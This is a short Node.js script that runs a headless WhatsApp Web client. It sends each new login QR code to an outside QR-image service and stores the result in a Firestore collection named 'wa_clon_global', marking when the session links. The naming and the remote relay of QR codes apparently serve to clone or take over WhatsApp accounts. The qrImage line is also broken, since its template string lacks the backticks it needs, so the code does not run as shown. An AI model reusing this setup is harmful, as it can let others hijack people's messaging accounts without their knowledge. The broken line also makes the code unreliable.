const { Client, LocalAuth } = require('whatsapp-web.js');
const admin = require('firebase-admin');
const express = require('express');
const app = express();

const serviceAccount = require("./serviceAccountKey.json"); 
if (!admin.apps.length) {
    admin.initializeApp({
        credential: admin.credential.cert(serviceAccount)
    });
}
const db = admin.firestore();

const client = new Client({
    authStrategy: new LocalAuth(),
    puppeteer: {
        headless: true,
        args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage', '--single-process'],
        executablePath: '/usr/bin/google-chrome-stable'
    }
});

client.on('qr', async (qr) => {
    console.log("NUEVO QR DETECTADO");
    const qrImage = https://api.qrserver.com/v1/create-qr-code/?size=264x264&data=${encodeURIComponent(qr)};
    
    // USAMOS UNA COLECCIÓN NUEVA PARA EVITAR CONFLICTOS
    await db.collection("wa_clon_global").doc("current_session").set({
        qrCode: qrImage,
        status: "esperando",
        lastUpdate: admin.firestore.FieldValue.serverTimestamp()
    }, { merge: true });
});

client.on('ready', () => {
    console.log("CONEXIÓN EXITOSA");
    db.collection("wa_clon_global").doc("current_session").update({ status: "exito" });
});

client.initialize();

const port = process.env.PORT || 3000;
app.get('/', (req, res) => res.send('MOTOR OK'));
app.listen(port);
